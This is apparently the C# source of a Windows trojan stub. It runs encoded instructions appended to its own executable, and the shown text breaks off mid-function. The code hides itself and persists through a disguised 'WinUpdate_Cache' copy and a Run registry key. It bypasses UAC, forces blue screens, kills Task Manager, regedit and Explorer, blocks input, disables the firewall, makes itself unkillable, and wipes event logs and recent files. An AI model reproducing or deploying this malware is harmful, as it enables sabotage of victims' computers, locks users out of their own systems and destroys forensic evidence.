using System.Windows.Forms;
using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Principal;
using Microsoft.Win32;
using System.Management;
using System.IO;

public partial class MainForm : Form
{
    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

    [DllImport("kernel32.dll")]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
    [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern int UnhookWindowsHookEx(int hHook);
    public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

    [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
    public const int WH_KEYBOARD_LL = 13;

    [DllImport("user32.dll")]
    public static extern Int32 SwapMouseButton(Int32 bSwap);

    public struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public int dwExtraInfo;
    }

    public static int intLLKey;

    private bool ProcessTerminating = false, AntiExplorer = false, AntiTaskManager = false, AntiRegistryTools = false, AntiControlPanel = false, AntiThreadTermination = false, CriticalProcess = false;
    private int instructionsThreadID = -1, controllerThreadID = -1;
    private int ThreadID1 = -1, ThreadID2 = -1, ThreadID3 = -1, ThreadID4 = -1, MegaThreadControllerID = -1, AntiWindowsThreadID = -1;
    private bool SetStartup = false, MonitorFirst = false, AntiSeeFile = false, AlwaysBlockInput = false;
    private string NewPath = Application.ExecutablePath;
    private bool AntiWindowsEventLogs = false, AntiWindowsRecentFiles = false;

    protected override CreateParams CreateParams
    {
        get
        {
            var cp = base.CreateParams;
            cp.ExStyle |= 0x80;
            return cp;
        }
    }

    public void DoAntiWindows()
    {
        if (AntiThreadTermination)
        {
            Thread.BeginThreadAffinity();
        }

        AntiWindowsThreadID = AppDomain.GetCurrentThreadId();

        while (true)
        {
            Thread.Sleep(100);

            if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && instructionsThreadID != -1 && MegaThreadControllerID != -1 && AntiThreadTermination)
            {
                bool instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;

                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    if (thread.Id == instructionsThreadID)
                    {
                        instructionsFound = true;
                    }
                    else if (thread.Id == ThreadID1)
                    {
                        thread1Found = true;
                    }
                    else if (thread.Id == ThreadID2)
                    {
                        thread2Found = true;
                    }
                    else if (thread.Id == ThreadID3)
                    {
                        thread3Found = true;
                    }
                    else if (thread.Id == ThreadID4)
                    {
                        thread4Found = true;
                    }
                    else if (thread.Id == MegaThreadControllerID)
                    {
                        megaThreadController = true;
                    }
                }

                if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController)
                {
                    TriggerBSOD();
                    return;
                }
            }

            if (AntiWindowsEventLogs)
            {
                try
                {
                    Utils.RunPowerShell("Get-EventLog -LogName * | ForEach { Clear - EventLog $_.Log }");
                    Utils.RunPowerShell("wevtutil el | Foreach-Object {wevtutil cl “\"$_\"”}");
                }
                catch
                {

                }
            }

            if (AntiWindowsRecentFiles)
            {
                try
                {
                    foreach (string file in System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":" + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
                    {
                        try
                        {
                            File.Delete(file);
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {

                }
            }
        }
    }

    public void DoAntiTaskManager()
    {
        if (AntiThreadTermination)
        {
            Thread.BeginThreadAffinity();
        }

        controllerThreadID = AppDomain.GetCurrentThreadId();

        while (true)
        {
            Thread.Sleep(100);

            if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && instructionsThreadID != -1 && MegaThreadControllerID != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
            {
                bool antiWindowsFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;

                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    if (thread.Id == instructionsThreadID)
                    {
                        instructionsFound = true;
                    }
                    else if (thread.Id == ThreadID1)
                    {
                        thread1Found = true;
                    }
                    else if (thread.Id == ThreadID2)
                    {
                        thread2Found = true;
                    }
                    else if (thread.Id == ThreadID3)
                    {
                        thread3Found = true;
                    }
                    else if (thread.Id == ThreadID4)
                    {
                        thread4Found = true;
                    }
                    else if (thread.Id == MegaThreadControllerID)
                    {
                        megaThreadController = true;
                    }
                    else if (thread.Id == AntiWindowsThreadID)
                    {
                        antiWindowsFound = true;
                    }
                }

                if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                {
                    TriggerBSOD();
                    return;
                }
            }

            if (AntiSeeFile)
            {
                HideFile();
            }

            if (AntiTaskManager)
            {
                SetAntiTaskManager(true);
            }

            if (AntiRegistryTools)
            {
                SetAntiRegistryTools(true);
            }

            if (AntiControlPanel)
            {
                SetAntiControlPanel(true);
            }

            if (CriticalProcess && !ProcessTerminating)
            {
                Unkillable.MakeProcessUnkillable();
            }

            if (AlwaysBlockInput)
            {
                BlockInput(true);
            }

            if (SetStartup)
            {
                bool bsod = false;

                if (MonitorFirst)
                {
                    if (!System.IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache"))
                    {
                        System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache");
                        DirectoryInfo di = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache");
                        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                        bsod = true;
                    }

                    if (!System.IO.File.Exists(NewPath))
                    {
                        System.IO.File.Copy(Application.ExecutablePath, NewPath);
                        System.IO.File.SetAttributes(NewPath, System.IO.FileAttributes.Hidden);
                        FileInfo fileInfo = new FileInfo(NewPath);
                        fileInfo.IsReadOnly = true;
                    }
                }

                bool exists = false;
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                foreach (string name in rk.GetValueNames())
                {
                    if (rk.GetValue(name).Equals(NewPath))
                    {
                        exists = true;
                        break;
                    }
                }

                rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);

                foreach (string name in rk.GetValueNames())
                {
                    if (rk.GetValue(name).Equals(NewPath))
                    {
                        exists = true;
                        break;
                    }
                }

                if (!exists)
                {
                    RegistryKey rk1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk1.SetValue(new ProtoRandom(5).GetRandomString("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToArray(), 16), NewPath);
                    bsod = true;
                }

                if (bsod)
                {
                    TriggerBSOD();
                    return;
                }
            }

            if (AntiTaskManager || AntiRegistryTools || AntiControlPanel || AntiExplorer)
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (AntiTaskManager)
                        {
                            if (process.ProcessName.ToLower().Equals("taskmgr") || process.ProcessName.ToLower().Equals("processhacker"))
                            {
                                process.Kill();
                            }
                        }

                        if (AntiRegistryTools)
                        {
                            if (process.ProcessName.ToLower().Equals("regedit"))
                            {
                                process.Kill();
                            }
                        }

                        if (AntiControlPanel)
                        {
                            if (process.ProcessName.ToLower().Equals("control"))
                            {
                                process.Kill();
                            }
                        }

                        if (AntiExplorer)
                        {
                            if (process.ProcessName.ToLower().Equals("everything"))
                            {
                                process.Kill();
                            }
                            else if (process.ProcessName.ToLower().Equals("explorer"))
                            {
                                TerminateProcess(process.Handle, 1);
                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }
        }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    public MainForm()
    {
        InitializeComponent();
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        Hide();
        Enabled = false;
        Visible = false;
        Opacity = 0;
        Size = new System.Drawing.Size(0, 0);
        Location = new System.Drawing.Point(0, 0);

        new Thread(DoAntiTaskManager) { Priority = ThreadPriority.Highest }.Start();
        new Thread(DoAntiWindows) { Priority = ThreadPriority.Highest }.Start();
        new Thread(ExecuteInstructions) { Priority = ThreadPriority.Highest }.Start();

        for (int i = 0; i < 4; i++)
        {
            new Thread(() => ThreadController(i)) { Priority = ThreadPriority.Highest }.Start();
        }

        new Thread(MegaThreadController) { Priority = ThreadPriority.Highest }.Start();

        if ((new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            CDACL.ChangeDACLStatus(Process.GetCurrentProcess().Handle, true);
            CDACL.ChangeDACLStatus(GetCurrentProcess(), true);
        }

        foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
        {
            try
            {
                thread.PriorityLevel = ThreadPriorityLevel.Highest;
            }
            catch
            {

            }
        }
    }

    public void MegaThreadController()
    {
        if (AntiThreadTermination)
        {
            Thread.BeginThreadAffinity();
        }

        MegaThreadControllerID = AppDomain.GetCurrentThreadId();

        while (true)
        {
            Thread.Sleep(25);

            if (controllerThreadID != -1 && instructionsThreadID != -1 && ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && AntiThreadTermination)
            {
                bool antiWindowsFound = false, controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false;

                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    if (thread.Id == controllerThreadID)
                    {
                        controllerFound = true;
                    }
                    else if (thread.Id == instructionsThreadID)
                    {
                        instructionsFound = true;
                    }
                    else if (thread.Id == ThreadID1)
                    {
                        thread1Found = true;
                    }
                    else if (thread.Id == ThreadID2)
                    {
                        thread2Found = true;
                    }
                    else if (thread.Id == ThreadID3)
                    {
                        thread3Found = true;
                    }
                    else if (thread.Id == ThreadID4)
                    {
                        thread4Found = true;
                    }
                    else if (thread.Id == AntiWindowsThreadID)
                    {
                        antiWindowsFound = true;
                    }
                }

                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !antiWindowsFound)
                {
                    TriggerBSOD();
                    return;
                }
            }
        }
    }

    public void ThreadController(int i)
    {
        if (AntiThreadTermination)
        {
            Thread.BeginThreadAffinity();
        }

        if (i == 1)
        {
            ThreadID1 = AppDomain.GetCurrentThreadId();
        }
        else if (i == 2)
        {
            ThreadID2 = AppDomain.GetCurrentThreadId();
        }
        else if (i == 3)
        {
            ThreadID3 = AppDomain.GetCurrentThreadId();
        }
        else if (i == 4)
        {
            ThreadID4 = AppDomain.GetCurrentThreadId();
        }

        while (true)
        {
            Thread.Sleep(100);

            if (controllerThreadID != -1 && instructionsThreadID != -1 && ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
            {
                bool antiWindowsFound = false, controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;

                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    if (thread.Id == controllerThreadID)
                    {
                        controllerFound = true;
                    }
                    else if (thread.Id == instructionsThreadID)
                    {
                        instructionsFound = true;
                    }
                    else if (thread.Id == ThreadID1)
                    {
                        thread1Found = true;
                    }
                    else if (thread.Id == ThreadID2)
                    {
                        thread2Found = true;
                    }
                    else if (thread.Id == ThreadID3)
                    {
                        thread3Found = true;
                    }
                    else if (thread.Id == ThreadID4)
                    {
                        thread4Found = true;
                    }
                    else if (thread.Id == MegaThreadControllerID)
                    {
                        megaThreadController = true;
                    }
                    else if (thread.Id == AntiWindowsThreadID)
                    {
                        antiWindowsFound = true;
                    }
                }

                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                {
                    TriggerBSOD();
                    return;
                }
            }
        }
    }

    public void ExecuteInstructions()
    {
        if (AntiThreadTermination)
        {
            Thread.BeginThreadAffinity();
        }

        instructionsThreadID = AppDomain.GetCurrentThreadId();
        string readFile = System.IO.File.ReadAllText(System.Reflection.Assembly.GetEntryAssembly().Location);

        if (readFile.Contains("|TROJAN_CREATOR_SPLITTED|"))
        {
            string[] splitted = Microsoft.VisualBasic.Strings.Split(readFile, "|TROJAN_CREATOR_SPLITTED|");
            string otherString = splitted[1];

            if (otherString.Contains("|"))
            {
                foreach (string instr in otherString.Split('|'))
                {
                    try
                    {
                        ExecuteInstruction(instr);
                    }
                    catch
                    {

                    }

                    if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && controllerThreadID != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
                    {
                        bool antiWindowsFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;

                        foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                        {
                            if (thread.Id == controllerThreadID)
                            {
                                instructionsFound = true;
                            }
                            else if (thread.Id == ThreadID1)
                            {
                                thread1Found = true;
                            }
                            else if (thread.Id == ThreadID2)
                            {
                                thread2Found = true;
                            }
                            else if (thread.Id == ThreadID3)
                            {
                                thread3Found = true;
                            }
                            else if (thread.Id == ThreadID4)
                            {
                                thread4Found = true;
                            }
                            else if (thread.Id == MegaThreadControllerID)
                            {
                                antiWindowsFound = true;
                            }
                        }

                        if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                        {
                            TriggerBSOD();
                            return;
                        }
                    }
                }
            }
            else
            {
                ExecuteInstruction(otherString);
            }
        }

        TerminateProcess();
    }

    public void TerminateProcess()
    {
        ProcessTerminating = true;
        SetAntiTaskManager(false);
        SetAntiControlPanel(false);
        SetAntiRegistryTools(false);
        Unkillable.MakeProcessKillable();
        Process.GetCurrentProcess().Kill();
    }

    public void TriggerBSOD()
    {
        try
        {
            Boolean t1;
            uint t2;

            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        catch
        {

        }

        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (process.Id != Process.GetCurrentProcess().Id)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                    }
                    catch
                    {

                    }

                    try
                    {
                        process.Kill();
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }
    }

    public void ExecuteInstruction(string str)
    {
        byte[] theBytes = Convert.FromBase64String(str);
        int operationType = BitConverter.ToInt32(theBytes.Take(4).ToArray(), 0);
        theBytes = theBytes.Skip(4).ToArray();

        if (operationType == 1)
        {
            string title = ReadString(ref theBytes), content = ReadString(ref theBytes),
                icon = ReadString(ref theBytes), buttons = ReadString(ref theBytes);
            MessageBox.Show(content, title, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), buttons), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), icon));
        }
        else if (operationType == 2)
        {
            string method = ReadString(ref theBytes);

            if (method == "Kernel Exploit 1")
            {
                Boolean t1;
                uint t2;

                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
            }
            else if (method == "Kernel Exploit 2")
            {
                Boolean t3;
                uint t4;

                RtlAdjustPrivilege(19, true, false, out t3);
                NtRaiseHardError(0xc0000420, 0, 0, IntPtr.Zero, 6, out t4);
            }
            else if (method == "Critical Process Died")
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.Id != Process.GetCurrentProcess().Id)
                        {
                            try
                            {
                                process.PriorityClass = ProcessPriorityClass.BelowNormal;
                            }
                            catch
                            {

                            }

                            try
                            {
                                process.Kill();
                            }
                            catch
                            {

                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }
        }
        else if (operationType == 3)
        {
            string milliseconds = ReadString(ref theBytes);
            Thread.Sleep(int.Parse(milliseconds));
        }
        else if (operationType == 4)
        {
            string action = ReadString(ref theBytes);

            if (action == "Hide")
            {
                Taskbar.Hide();
            }
            else if (action == "Show")
            {
                Taskbar.Show();
            }
        }
        else if (operationType == 5)
        {
            string action = ReadString(ref theBytes);

            if (action == "Hide")
            {
                Desktop.Hide();
            }
            else if (action == "Show")
            {
                Desktop.Show();
            }
        }
        else if (operationType == 6)
        {
            string action = ReadString(ref theBytes);

            if (action == "Hide")
            {
                DesktopIcons.Hide();
            }
            else if (action == "Show")
            {
                DesktopIcons.Show();
            }
        }
        else if (operationType == 7)
        {
            string action = ReadString(ref theBytes);

            if (action == "Enable")
            {
                Monitor.Enable();
            }
            else if (action == "Disable")
            {
                Monitor.Disable();
            }
        }
        else if (operationType == 8)
        {
            string action = ReadString(ref theBytes);

            if (action == "Enable")
            {
                CriticalProcess = true;
                Unkillable.MakeProcessUnkillable();
            }
            else if (action == "Disable")
            {
                CriticalProcess = false;
                Unkillable.MakeProcessKillable();
            }
        }
        else if (operationType == 9)
        {
            string action = ReadString(ref theBytes);

            if (action == "ReRun")
            {
                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    Bypass.UAC();
                    string WhatToElevate = Application.ExecutablePath;
                    Process.Start("CMD.exe", "/c start \"" + WhatToElevate + "\"");
                    RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell");
                    uac_clean.Close();
                    Process.GetCurrentProcess().Kill();
                    return;
                }
            }
        }
        else if (operationType == 10)
        {
            string action = ReadString(ref theBytes);

            if (action == "Restart")
            {
                ManagementBaseObject mboShutdown = null;
                ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");

                mcWin32.Get();
                mcWin32.Scope.Options.EnablePrivileges = true;

                ManagementBaseObject mboShutdownParams = mcWin32.GetMethodParameters("Win32Shutdown");
                mboShutdownParams["Flags"] = "2";
                mboShutdownParams["Reserved"] = "0";

                foreach (ManagementObject manObj in mcWin32.GetInstances())
                {
                    mboShutdown = manObj.InvokeMethod("Win32Shutdown", mboShutdownParams, null);
                }
            }
            else if (action == "Shutdown")
            {
                ManagementBaseObject mboShutdown = null;
                ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");

                mcWin32.Get();
                mcWin32.Scope.Options.EnablePrivileges = true;

                ManagementBaseObject mboShutdownParams = mcWin32.GetMethodParameters("Win32Shutdown");
                mboShutdownParams["Flags"] = "5";
                mboShutdownParams["Reserved"] = "0";

                foreach (ManagementObject manObj in mcWin32.GetInstances())
                {
                    mboShutdown = manObj.InvokeMethod("Win32Shutdown", mboShutdownParams, null);
                }
            }
        }
        else if (operationType == 11)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiTaskManager = true;
            }
            else if (action == "Stop")
            {
                AntiTaskManager = false;
                SetAntiTaskManager(false);
            }
        }
        else if (operationType == 12)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiRegistryTools = true;
            }
            else if (action == "Stop")
            {
                AntiRegistryTools = false;
                SetAntiRegistryTools(false);
            }
        }
        else if (operationType == 13)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiControlPanel = true;
            }
            else if (action == "Stop")
            {
                AntiControlPanel = false;
                SetAntiControlPanel(false);
            }
        }
        else if (operationType == 14)
        {
            AntiThreadTermination = ReadString(ref theBytes) == "Start";
        }
        else if (operationType == 15)
        {
            string visibility = ReadString(ref theBytes);

            if (!System.IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache") || (System.IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache") && System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache").Length == 0))
            {
                System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache");
                string newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache\\" + new ProtoRandom(5).GetRandomString("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToArray(), 16) + ".exe";
                NewPath = newFilePath;
                System.IO.File.Copy(Application.ExecutablePath, newFilePath);
                System.IO.File.SetAttributes(newFilePath, System.IO.FileAttributes.Hidden);
                DirectoryInfo di = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                FileInfo fileInfo = new FileInfo(newFilePath);
                fileInfo.IsReadOnly = true;
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue(new ProtoRandom(5).GetRandomString("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToArray(), 16), newFilePath);
                MonitorFirst = true;
                SetStartup = true;
            }
            else
            {
                SetStartup = true;
            }
        }
        else if (operationType == 16)
        {
            string type = ReadString(ref theBytes), milliseconds = ReadString(ref theBytes), executeOther = ReadString(ref theBytes);
            new Thread(() => ShowJumpscare(type, milliseconds, executeOther)).Start();

            if (milliseconds != "UNLIMITED_TIME")
            {
                if (executeOther == "False")
                {
                    Thread.Sleep(int.Parse(milliseconds));
                }
            }
        }
        else if (operationType == 17)
        {
            string action = ReadString(ref theBytes);

            if (action == "Disable")
            {
                BlockInput(true);
                AlwaysBlockInput = true;
            }
            else if (action == "Enable")
            {
                AlwaysBlockInput = false;
                BlockInput(false);
            }
        }
        else if (operationType == 18)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                HideFile();
                AntiSeeFile = true;
            }
            else if (action == "Stop")
            {
                AntiSeeFile = false;
            }
        }
        else if (operationType == 19)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiExplorer = true;
            }
            else if (action == "Stop")
            {
                AntiExplorer = false;
            }
        }
        else if (operationType == 20)
        {
            string action = ReadString(ref theBytes);

            if (action == "Enable")
            {
                UnhookWindowsHookEx(intLLKey);
            }
            else if (action == "Disable")
            {
                intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
            }
        }
        else if (operationType == 21)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                while (true)
                {
                    Thread.Sleep(10);
                }
            }
        }
        else if (operationType == 22)
        {
            string action = ReadString(ref theBytes);

            if (action == "Swap")
            {
                SwapMouseButton(1);
            }
            else if (action == "Unswap")
            {
                SwapMouseButton(0);
            }
        }
        else if (operationType == 23)
        {
            Process process = new Process();
            process.StartInfo.Arguments = $"Firewall set opmode {ReadString(ref theBytes).ToLower()}";
            process.StartInfo.FileName = "netsh.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.Verb = "runas";
            process.Start();
            process.WaitForExit();
        }
        else if (operationType == 24)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiWindowsEventLogs = true;
            }
            else if (action == "Stop")
            {
                AntiWindowsEventLogs = false;
            }
        }
        else if (operationType == 25)
        {
            string action = ReadString(ref theBytes);

            if (action == "Start")
            {
                AntiWindowsRecentFiles = true;
            }
            else if (action == "Stop")
            {
                AntiWindowsRecentFiles = false;
            }
        }
    }

    public int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
    {
        return 1;
    }

    public void HideFile()
    {
        try
        {
            System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch
        {

        }

        try
        {
            System.IO.File.SetAttributes(NewPath, FileAttributes.Hidden);
        }
        catch
        {

        }

        try
        {
            FileInfo fileInfo = new FileInfo(NewPath);
            fileInfo.IsReadOnly = true;
        }
        catch
        {

        }

        try
        {
            FileInfo fileInfo = new FileInfo(Application.ExecutablePath);
            fileInfo.IsReadOnly = true;
        }
        catch
        {

        }

        if (System.IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache"))
        {
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdate_Cache");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch
            {

            }
        }

        try
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                Guid CLSID_ShellApplication = new Guid("13709620-C279-11CE-A49E-444553540000");
                Type shellApplicationType = Type.GetTypeFromCLSID(CLSID_ShellApplication, true);
                object shellApplication = Activator.CreateInstance(shellApplicationType);
                object windows = shellApplicationType.InvokeMember("Windows", System.Reflection.BindingFlags.InvokeMethod, null, shellApplication, new object[] { });
                Type windowsType = windows.GetType();
                object count = windowsType.InvokeMember("Count", System.Reflection.BindingFlags.GetProperty, null, windows, null);

                for (int i = 0; i < (int)count; i++)
                {
                    try
                    {
                        object item = windowsType.InvokeMember("Item", System.Reflection.BindingFlags.InvokeMethod, null, windows, new object[] { i });
                        Type itemType = item.GetType();

                        string itemName = (string)itemType.InvokeMember("Name", System.Reflection.BindingFlags.GetProperty, null, item, null);

                        if (itemName == "Windows Explorer")
                        {
                            itemType.InvokeMember("Refresh", System.Reflection.BindingFlags.InvokeMethod, null, item, null);
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }
        catch
        {

        }
    }

    public void ShowJumpscare(string type, string milliseconds, string executeOther)
    {
        Jumpscare jumpscare = new Jumpscare();

        foreach (Control control in jumpscare.Controls)
        {
            if (control.Name.Equals("label1"))
            {
                Label label = (Label)control;

                if (label.InvokeRequired)
                {
                    label.Invoke((MethodInvoker)delegate
                    {
                        label.Text = type;
                    });
                }
                else
                {
                    label.Text = type;
                }
            }
            else if (control.Name.Equals("label2"))
            {
                Label label = (Label)control;

                if (label.InvokeRequired)
                {
                    label.Invoke((MethodInvoker)delegate
                    {
                        label.Text = milliseconds;
                    });
                }
                else
                {
                    label.Text = milliseconds;
                }
            }
            else if (control.Name.Equals("label3"))
            {
                Label label = (Label)control;

                if (label.InvokeRequired)
                {
                    label.Invoke((MethodInvoker)delegate
                    {
                        label.Text = executeOther;
                    });
                }
                else
                {
                    label.Text = executeOther;
                }
            }
        }

        jumpscare.ShowDialog();
    }

    public byte[] ReadBytes()
    {
        var bytes = default(byte[]);

        using (FileStream stream = System.IO.File.Open(System.Reflection.Assembly.GetEntryAssembly().Location, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
        {
            using (StreamReader reader = new StreamReader(stream))
            {
                using (var memstream = new MemoryStream())
                {
                    reader.BaseStream.CopyTo(memstream);
                    bytes = memstream.ToArray();
                }

                reader.Close();
                stream.Close();

                reader.Dispose();
                stream.Dispose();
            }
        }

        return bytes;
    }

    public void SetAntiTaskManager(bool enable)
    {
        try
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");

            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                if (enable)
                {
                    objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                }
            }
            else
            {
                if (!enable)
                {
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                }
            }

            objRegistryKey.Close();
        }
        catch
        {

        }
    }

    public void SetAntiRegistryTools(bool enable)
    {
        if (enable)
        {
            try
            {
